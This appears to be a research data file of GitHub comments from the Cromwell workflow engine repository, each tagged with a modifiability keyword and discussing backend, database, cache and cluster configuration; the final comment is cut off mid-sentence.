Modifiability,"Thanks for the feedback. Can you elaborate more on the need to be able to; run a container as privileged?. It could (in theory) be parameterized if required but it seems hazardous to; have this be the default. On Tue, Jan 5, 2021 at 5:42 PM Shane Canon <notifications@github.com> wrote:. > We have a similar need. This overlaps a little with #4579; > <https://github.com/broadinstitute/cromwell/issues/4579>. It would be; > useful if the submit-docker was parameterized similar to how it is for some; > of the other backends.; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-754946394>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ELZQ5HVOSV2JRMIH3LSYOIVRANCNFSM4RQDAKPQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-755294082:131,parameteriz,parameterized,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-755294082,2,['parameteriz'],['parameterized']
Modifiability,Thanks for the response @danbills - this is on a compute node which only has access to the outside network through an http(s)/ftp proxy so it can't do name resolution for outside addresses. Why does cromwell try to resolve that particular address? We don't have docker available and I tried with a config file that only defines a local and slurm backend and still get the same exceptions.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626#issuecomment-462393738:298,config,config,298,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626#issuecomment-462393738,1,['config'],['config']
Modifiability,Thanks for the review!. > Actually @kshakir pointed out that the test coverage on this patch is reported as 0% which given what it looks like the test is trying to do is kind of surprising... running `sbt coverageOn sfsBackend/test coverageAggregate coverageReport`; On this commit does generate a coverageReport. It shows that the extra code is being tested. So the codecov results are incorrect. (This PR is 75% test code for a reason!). Maybe it has something to do with me being an external contributor? I do not get access to travis secret variables. So if these are needed to report the coverage it will show up as 0%.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5043#issuecomment-505298313:545,variab,variables,545,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5043#issuecomment-505298313,1,['variab'],['variables']
Modifiability,"Thanks for this help with the configuration. I'm not intentionally overwriting the global `filesystem`, but I don't have an explicit import of reference.conf. Do I need to have an import like we do for `application`? Do you spot anything else I might be doing wrong?. https://gist.github.com/chapmanb/72c6bf2d8282412b252f6192968b17cf. I appreciate all the help debugging this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-426279585:30,config,configuration,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-426279585,1,['config'],['configuration']
Modifiability,"Thanks for your reply. I set the sql_mode ```SET GLOBAL sql_mode = 'ANSI_QUOTES';``` , than a new error occur. But when I change ``` driver = ""slick.driver.MySQLDriver$"" ``` to ```profile = ""slick.jdbc.MySQLProfile$""``` in cromwell.conf, all going well. ```; database {; # driver = ""slick.driver.MySQLDriver$""; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true&useSSL=false""; user = ""user""; password = ""123456""; connectionTimeout = 5000; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4382#issuecomment-438664522:428,rewrite,rewriteBatchedStatements,428,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4382#issuecomment-438664522,1,['rewrite'],['rewriteBatchedStatements']
Modifiability,"Thanks so much for walking through this. The tests are develop built on Friday after the merge. This is the CWL workflow I'm running, which isn't much different than the ones we've tested on but has everything in Google Storage:. https://github.com/bcbio/test_bcbio_cwl/tree/master/gcp. and this is the configuration:. https://gist.github.com/chapmanb/93d5468ac691012eaf70e67c17ed2498. It's running good up until this point, which I'm excited about. I figured I triggered the issue by having a slightly longer root location:. https://gist.github.com/chapmanb/93d5468ac691012eaf70e67c17ed2498#file-bcbio-cromwell-gcp-conf-L89. Thanks again for helping look at it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4471#issuecomment-445563569:303,config,configuration,303,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4471#issuecomment-445563569,1,['config'],['configuration']
Modifiability,Thanks to @ruchim both Green (single sample / arrays) workflows are integrated into the Jenkins [tyburn-cromwell-test](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/tyburn-cromwell-test/) job. This job runs daily at 8 am M-F currently and is governed by the Jenkins [tyburn-master-job](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/tyburn-master-test/) The code is not checked into develop because of Tyburn history 😡 so all the integrated test code is located on the rm_startingPoint [branch](https://github.com/broadinstitute/tyburn/tree/rm_startingPoint). Hopefully it will be back in develop soon but it probably wont be before my sabbatical is over so this is the current state of things. In the [configure](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/tyburn-cromwell-test/configure) of the jenkins tyburn-cromwell-test job there is a script section where we invoke the tyburn command we use to run the test. Here you can config values that change shape the test. ```; -Dexecutioners.workflowToInstance.singlesample=1 \; -Dexecutioners.workflowToInstance.arrays=1 \; -Dexecutioners.workflowToInstance.lots_of_inputs=1 \; ```. Each value tells Tyburn how many instances of each test to run. Currently it is set to 1 because we weren't sure what kind of load we were going for and how often the test will run.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2337#issuecomment-311365377:722,config,configure,722,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2337#issuecomment-311365377,3,['config'],"['config', 'configure']"
Modifiability,Thanks! . https://github.com/broadinstitute/firecloud-develop/blob/18ebf8ff504bd21618515e1d748d2d0f5fd38e32/base-configs/cromwell/cromwell.conf.ctmpl#L36'. This should similarly go into `firecloud-develop`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4615#issuecomment-461120477:113,config,configs,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4615#issuecomment-461120477,1,['config'],['configs']
Modifiability,"Thanks! I did see the trailing `/` is added by Cromwell: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/VpcAndSubnetworkProjectLabelValues.scala#L15. I tried to set by literals as the following:. ```; virtual-private-cloud {; network-name = ""$NETWORK-NAME""; subnetwork-name = ""$SUBNETWORK-NAME""; auth = ""application-default""; }; ```; where `$NETWORK-NAME` and `$SUBNETWORK-NAME` are replaced by the values of `my-private-network` and `my-private-subnetwork` labels, and hidden here. but my server failed immediately when starting:. ```; 2024-08-20 21:43:02 main WARN - Failed to build GcpBatchConfigurationAttributes on attempt 1 of 3, retrying.; cromwell.backend.google.batch.models.GcpBatchConfigurationAttributes$$anon$1: Google Cloud Batch configuration is not valid: Errors:; Virtual Private Cloud configuration is invalid. Missing keys: `network-label-key`.; ```. It looks like the GCP Batch config requires `network-label-key`, which is not optional...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641:836,config,configuration,836,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7500#issuecomment-2299820641,3,['config'],"['config', 'configuration']"
Modifiability,Thanks. Let's make this tunable via config as part of this ticket,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1097#issuecomment-230538183:36,config,config,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1097#issuecomment-230538183,1,['config'],['config']
Modifiability,Thanks. Pretty sure the one-reviewer-on-Centaur config was really intended for our arboreal friends to not require a Cromwellian thumb if they were only touching Centaur files. From a brief scan of the PullApprove docs I'm not readily seeing a way to require two thumbs for a Cromwellian-initiated PR.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3691#issuecomment-392157369:48,config,config,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3691#issuecomment-392157369,1,['config'],['config']
Modifiability,"Thanks. What's strange is that many other analyses _were_ being run successfully at the time. If the PAPI retry mechanism is somewhat deficient, maybe it makes sense for Cromwell to mask that by resubmitting the analysis? E.g. there could be a config setting for the number of times to retry analyses that fail for transient-looking reasons.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5001#issuecomment-495744779:244,config,config,244,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5001#issuecomment-495744779,1,['config'],['config']
Modifiability,That is quite some digging you've done! I hope you were able to reach an acceptable working configuration. I am going to go ahead and close this issue because there is not a clear Cromwell bug here as far as I can see.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465#issuecomment-464201945:92,config,configuration,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465#issuecomment-464201945,1,['config'],['configuration']
Modifiability,"That plot is the load on the Cromwell server itself? . From what's you've said, and the top output, it looks like your tasks are exeucting on that server as well. You mentioned that you're running SFS, can you tell us more about your configuration? Are you dispatching to PBS but the execution host is the cromwell server itself (where the sync commands are running)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284736542:234,config,configuration,234,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284736542,1,['config'],['configuration']
Modifiability,"That workaround has got me curious... My previous understanding is that moving things out of the input block only has the effect of making them act like private variables. The spec also says that this region of [""non-input declarations""](https://github.com/openwdl/wdl/blob/69bbcb2cba54346b757b21b5b60d5d270f759eaf/versions/1.0/SPEC.md#non-input-declarations) are supposed to act as intermediate values, so I'm surprised tsv_arg can remain in the input section (since by merit of it being there, it can be overwritten by the user). How is this section implemented in Cromwell? Is it effectively just an extension of the input section, but the user can't directly set their values?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6910#issuecomment-1262745641:161,variab,variables,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6910#issuecomment-1262745641,1,['variab'],['variables']
Modifiability,"That's a cool use of this configuration to work around this issue !. I just want to give some context around it. This rate control was originally put in place to protect Cromwell against excessive load or a very large spike of jobs becoming runnable in a short period of time. Through this mechanism Cromwell can also stop starting new jobs altogether when under too heavy load.; While this achieve the desired effect of rate limiting how many submit requests are being sent to AWS batch in a period of time, I think a medium-term better fix is too implement something similar to the [PipelinesApiRequestManager](https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/api/PipelinesApiRequestManager.scala) for the AWS backend.; The reason is that it acts as a coarse level of granularity which might have undesired side-effects:. 1) it is a system wide configuration, meaning in a multi backend Cromwell it might be too constraining for some backends and not enough for others; 2) It also rate limits starting jobs that might actually be call cached and incur 0 requests to AWS Batch, making it too conservative; 3) It only helps rate limiting the number of job creation requests to batch. Once a job is started, it issues status requests to monitor the job which aren't throttled. Not to say that this is a bad workaround, I think it's a *good* workaround, but still a workaround :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444253181:26,config,configuration,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444253181,2,['config'],['configuration']
Modifiability,That's also a nice option indeed but streams only work if they can really run next to each other. If there are multiple tasks depending on the same file this become more difficult I think. Maybe a config value where the user can define if a subworkflow need to be completed or not to continue?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3814#issuecomment-400586197:197,config,config,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3814#issuecomment-400586197,1,['config'],['config']
Modifiability,"That's not currently possible, but IMO it's a good idea. . @kcibul what do you think about having a JES configuration setting for the default zone(s) for jobs? Currently it's just hardwired to us-central1-b",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267739604:104,config,configuration,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267739604,1,['config'],['configuration']
Modifiability,The Cromwell Developer's guide is here!; - [Quick Start](http://cromwell.readthedocs.io/en/develop/tutorials/FiveMinuteIntro/); - [How to Configure](http://cromwell.readthedocs.io/en/develop/tutorials/ConfigurationFiles/); - [Google Pipelines API quick start](http://cromwell.readthedocs.io/en/develop/tutorials/PipelinesApi101/); - [Timing Diagrams](http://cromwell.readthedocs.io/en/develop/tutorials/TimingDiagrams/); - [Setup a persistent server](http://cromwell.readthedocs.io/en/develop/tutorials/PersistentServer/); - [Setup on HPC cluster](http://cromwell.readthedocs.io/en/develop/tutorials/HPCIntro/); - [Run in Server Mode](http://cromwell.readthedocs.io/en/develop/tutorials/ServerMode/). Checkout the full [Cromwell Docs!](http://cromwell.rtfd.io),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2327#issuecomment-345271005:138,Config,Configure,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2327#issuecomment-345271005,2,['Config'],"['ConfigurationFiles', 'Configure']"
Modifiability,"The Cromwell server is operating in a different region than the configured batch queue. Make sure that `region` is specified in the application conf file and matches that of the batch queue. For example, if your batch queue ARN is:. ```; queueArn = ""arn:aws:batch:us-west-2:<account number>:job-queue/GenomicsDefaultQueue-6938bfa7d75c42c""; ^^^^^^^^^; queue region; ```. the application conf file should specify:. ```; region = ""us-west-2""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434808638:64,config,configured,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434808638,1,['config'],['configured']
Modifiability,"The DNS name `batch.default.amazonaws.com` does not resolve - perhaps you need to change a value of `default` in the config to something else. For example, `batch.us-east-1.amazonaws.com` resolves fine (though predictably doesn't respond to ping, load a web page, etc.).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434316568:117,config,config,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434316568,1,['config'],['config']
Modifiability,"The DOS schema changed to a pattern not queryable by JSON Paths-- specifically returning a nested array-of-objects where the array is unordered but only a certain object-value with a prefix should be returned... Found that someone had made the more flexible JQ filter syntax available, so switched to that library. I've still seen no evidence that the DOS schema won't change again, but hopefully the JQ filters will allow flexibly plucking out the right field as the schema hardens. The other alternative was submitting another PR if/when the schema changes again.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4127#issuecomment-423331432:249,flexible,flexible,249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4127#issuecomment-423331432,1,['flexible'],['flexible']
Modifiability,"The [quick start tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/FiveMinuteIntro/) uses. ```; java -jar cromwell-XY.jar [ ... ]; ```. so the `-jar` option would be the first thing to try. I also removed the potentially extraneous `cromwell` in `cromwell.jar cromwell run`:. ```; java -jar cromwell.jar -Dconfig.file=../config/LSF.conf run ../pipelines/bismark_pid.wdl -i ../pipelines/bismark_wgbs_pid.json; ```. If that doesn't work for you, feel free to reopen the issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6796#issuecomment-1177961608:333,config,config,333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6796#issuecomment-1177961608,1,['config'],['config']
Modifiability,"The `79` code is explained [here](https://github.com/broadinstitute/cromwell/blame/84/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala) and this might relate to an error in the command defined in the `check-alive` variable that is used to check whether a task is still alive. What could have happened is that the task completed correctly but when Cromwell went to check for the task being still running it received a temporary error which it interpreted as the task had failed, while the task might have completed successfully. A workaround is to substitute the `check-alive` function with something more complicated. On SLURM I have replaced:; ```; check-alive = ""squeue -j ${job_id}""; ```; with:; ```; check-alive = ""squeue -j ${job_id} || if [[ $? -eq 5004 ]]; then true; else exit $?; fi""; ```; The `5004` value corresponds to the SLURM error code SLURM_PROTOCOL_SOCKET_IMPL_TIMEOUT as implemented in [slurm_errno.h](https://github.com/SchedMD/slurm/blob/master/slurm/slurm_errno.h) and [slurm_errno.c](https://github.com/SchedMD/slurm/blob/master/src/common/slurm_errno.c). But I am not sure whether this workaround is sufficient",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093:149,config,config,149,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6988#issuecomment-1622129093,3,"['Config', 'config', 'variab']","['ConfigAsyncJobExecutionActor', 'config', 'variable']"
Modifiability,"The `cwl_dynamic_initial_workdir` fails with below stack trace:; ```; 2019-03-13 12:29:04,388 cromwell-system-akka.dispatchers.backend-dispatcher-88 ERROR - BackgroundConfigAsyncJobExecutionActor [UUID(c9194073)main:NA:1]: Error attempting to Execute; java.lang.Exception: Failed command instantiation; 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:581); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:515); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:317); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:316); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeS",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:570,config,config,570,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,4,"['Config', 'config']","['ConfigAsyncJobExecutionActor', 'config']"
Modifiability,"The `script` variable was busted, but docker was working in SFS land because, instead of `${script}` the local backend was using `${cwd}/execution/script` when launching docker jobs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2028#issuecomment-282778691:13,variab,variable,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2028#issuecomment-282778691,1,['variab'],['variable']
Modifiability,"The `thread.sleep` command would need to be added to whichever actor(s) is actually submitting messages to the API. This doesn't strike me as too onerous for the developers, but you're right, it's definitely part of the scala and not the config files. Some minimal exception catching is also called for. Rather than throttling concurrent _jobs_ it probably makes more sense to limit the number and frequency of concurrent _workflow submissions_:; ```# Cromwell ""system"" settings; system {; ; # Cromwell will cap the number of running workflows at N; max-concurrent-workflows = 5000 # No practical limit on the number of total workflows. # Cromwell will launch up to N submitted workflows at a time, regardless of how many open workflow slots exist; max-workflow-launch-count = 4 # Too conservative?. # Number of seconds between workflow launches; new-workflow-poll-rate = 5 # Too conservative?; }; ```; This should stagger submissions without limiting the total amount of work being done. The number of threads available to the backend-dispatcher also appears to settable. You could create an artificial bottleneck there to protect AWS's API.`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436674279:238,config,config,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436674279,1,['config'],['config']
Modifiability,"The docs are correct, the local docker backend does not recognize CPU and memory attributes, because it's impossible to implement with the Docker Desktop API. And even if it was, it would probably not ship because the local backend is intended as a down-featured sandbox environment.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1031557550:263,sandbox,sandbox,263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1031557550,1,['sandbox'],['sandbox']
Modifiability,The entire configuration here.; https://gist.github.com/rhpvorderman/cd91d3356e3fb460df09b0953c31eadb,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-394625591:11,config,configuration,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-394625591,1,['config'],['configuration']
Modifiability,"The error occurs again, I read this [thread](https://gatkforums.broadinstitute.org/wdl/discussion/9436/error-running-cromwell-27-snap-build-from-master), and configure the local mysql database rather in-memory database.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4403#issuecomment-440913258:158,config,configure,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4403#issuecomment-440913258,1,['config'],['configure']
Modifiability,"The following from application.conf aren't in the new templated file:; - webservice; - akka; - spray.can; - workflow-options; - docker. As long as we're happy that these won't be configurable from vault, :+1:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159076912:179,config,configurable,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159076912,1,['config'],['configurable']
Modifiability,"The following gives a 2 GB cache on top of Cromwell, and forwards aborts to a different host. I've manually tested with the following configuration as an excuse to play w/ Kubernetes:. ## Varnish config. points all queries to reader service except aborts:; ```; vcl 4.0;. backend worker {; .host = ""cromwell-worker-service.default"";; .port = ""8000"";; }. backend reader {; .host = ""cromwell-reader-service.default"";; .port = ""8000"";; }. sub vcl_recv {; if (req.url ~ ""abort/$"") {; set req.backend_hint = worker;; } else {; set req.backend_hint = reader;; }; }; ```; Source: https://raw.githubusercontent.com/danbills/ammoniteExample/master/kubernetes/varnish-rw-cromwell-config.vcl. ## Varnish docker . w/ latest 6.1 version:; https://hub.docker.com/r/danbills/varnish/; Source: https://github.com/danbills/ammoniteExample/tree/master/kubernetes/varnish. ## Kubernetes Config(map); Kubernetes [Pod](https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/) to run varnish w/ the config file loaded into a [ConfigMap](https://cloud.google.com/kubernetes-engine/docs/concepts/configmap) named `rw`:; ```; apiVersion: v1; kind: Pod; metadata:; name: varnish-cache; labels:; app: varnish-cache; spec:; containers:; - name: cache; resources:; requests:; # We'll use two gigabytes for each varnish cache; memory: 2Gi; image: danbills/varnish:6_1; imagePullPolicy: Always; args: [""-F"", ""-f"", ""/conf/varnish-rw-cromwell-config.vcl"", ""-a"" , ""0.0.0.0:8080"" , ""-s"" , ""malloc,2G""]; ports:; - containerPort: 8080; volumeMounts:; - name: config-volume; mountPath: /conf; volumes:; - name: config-volume; configMap:; # Provide the name of the ConfigMap containing the files you want; # to add to the container; name: rw; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4253#issuecomment-437427248:134,config,configuration,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4253#issuecomment-437427248,12,"['Config', 'config']","['Config', 'ConfigMap', 'config', 'config-volume', 'configMap', 'configmap', 'configuration']"
Modifiability,"The former. I didn’t change the config file, but I did override its default engine when submitting the jobs before the restart.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4215#issuecomment-444537979:32,config,config,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4215#issuecomment-444537979,1,['config'],['config']
Modifiability,"The future enhancements of `WdlFile` affecting this migrator still makes me uneasy, but this code looks good as is. 👍 . Also I'm assuming this won't get merged before the other migration PR?. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1340/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1340#issuecomment-242796644:11,enhance,enhancements,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1340#issuecomment-242796644,1,['enhance'],['enhancements']
Modifiability,"The hard-coded linking you found is part of the ""glob result capturing"" logic, which is a slightly different case from localizing files before job execution (which is why that config option isn't doing anything for you here). I'm not sure I'd want to merge the two concepts since a lot of people need to localize by copying but wouldn't necessarily want to have copies made of every glob output. I don't see any reason why we couldn't also have a `glob-evaluation-method` option with the same sort of priority ordering (except for the yet-another-config-option problem).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3876#issuecomment-403974995:176,config,config,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3876#issuecomment-403974995,2,['config'],"['config', 'config-option']"
Modifiability,"The intention is only to sever the logging to sentry pipeline - exceptions still go to Sentry. This file configures the log appender, i.e. where logs get sent, and does not say anything on exceptions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5065#issuecomment-510118963:105,config,configures,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5065#issuecomment-510118963,1,['config'],['configures']
Modifiability,"The issue is that the way one loads a backend into Cromwell is to reference the implementing scala class, like [this](https://github.com/broadinstitute/cromwell/blob/f1955f963ee65ca9296f554376bd655b9529c10d/cromwell.examples.conf#L466). If we change the name of that class old config files will be broken. In theory we could deprecate it and have some sort of redirect but not sure offhand how that'd work. We have the same problem in #2440",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-328217096:277,config,config,277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-328217096,1,['config'],['config']
Modifiability,"The issue was solved by adding cromwell configuration shown in **bold**:. backend {; providers {; slurm {; config {; **temporary-directory = ""/scratch/slurm/$SLURM_JOB_ID""**; submit-docker = """"""; sbatch \; --wrap ""singularity exec **-B /scratch**""; """"; }; }; }; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6757#issuecomment-1137137019:40,config,configuration,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757#issuecomment-1137137019,2,['config'],"['config', 'configuration']"
Modifiability,"The motivation for this is that I would like FireCloud/GAWB method configurations to include brief descriptions of declared input and output parameters. It would be great if these description fields could be initialized by metadata contained within a workflow's WDL file. I was thinking we could leverage the parameter_meta sections, but currently that section is only supported in the task definition block, and only for input parameters. I don't, however, want to request a specific solution....the use and expansion of the parameter_meta section may not be the answer. My primary goal is to be able to initialize the input/output parameter descriptions with strings drawn from the WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1131#issuecomment-230915259:67,config,configurations,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1131#issuecomment-230915259,1,['config'],['configurations']
Modifiability,"The only way they appear is similar at all is that they involve the database. FWIW this sort of topic falls under what I see as a third tier of Cromwell which we're not currently considering, but IMO will need to over the next year. There is/will be:. - Cromwell as we know it now. Not intended for horizontal scaling situations. Expected that it can meet the needs of most typical users needs out of the box without a lot of configuration and that it can run anywhere.; - Cromwell with cool implementations of subsystems that are optimized to take advantage of GCP for scaling purposes (i.e. CaaS, but such that a savvy user could set up their own if they wanted to); - An in between phase for people who have scaling needs beyond vanilla cromwell but aren't on GCP, and most likely are on more traditional setups (on prem, hpc, etc). To some extent we might be able to rely on outside contributions here once we've made supporting both the first two (as that'd imply taking advantage of things like the service registry for pluggable implementations) but we'll likely need to prime that 